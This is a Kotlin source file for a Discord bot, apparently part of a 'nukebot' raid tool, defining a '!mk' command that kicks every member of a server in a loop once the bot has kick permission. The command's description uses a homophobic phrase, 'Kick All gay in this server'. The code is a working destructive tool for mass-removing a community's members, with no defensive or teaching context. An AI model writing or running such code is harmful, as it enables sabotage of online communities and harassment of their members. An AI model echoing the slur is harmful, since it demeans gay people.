package thenano.nukebot.bot.command.commands

import net.dv8tion.jda.api.Permission
import net.dv8tion.jda.api.events.message.MessageReceivedEvent
import net.dv8tion.jda.api.exceptions.PermissionException
import thenano.nukebot.bot.command.CommandListener
import thenano.nukebot.bot.command.CommandManager
import kotlin.jvm.Throws

@CommandListener.Info("!mk","Kick All gay in this server",false)
class KickAll : CommandListener() {

    override fun onEvent(event: MessageReceivedEvent) {
        if (message.contentRaw.startsWith("!mk")) {
            if (guild.selfMember.hasPermission(Permission.KICK_MEMBERS)) {
                event.message.reply("Kicking").queue()
                for (member in guild.members) {
                    try {
                        guild.kick(member).queue()
                        println("Banned " + member.user.asTag)
                    } catch (e: PermissionException) {
                        println("Cannot kick " + member.user.asTag + "- PermissionException")
                    }
                    if (CommandManager.stop) break
                }
            } else {
                message.reply("Permission missing(kick member)").queue()
                message.delete().queue()
            }
        }
    }
}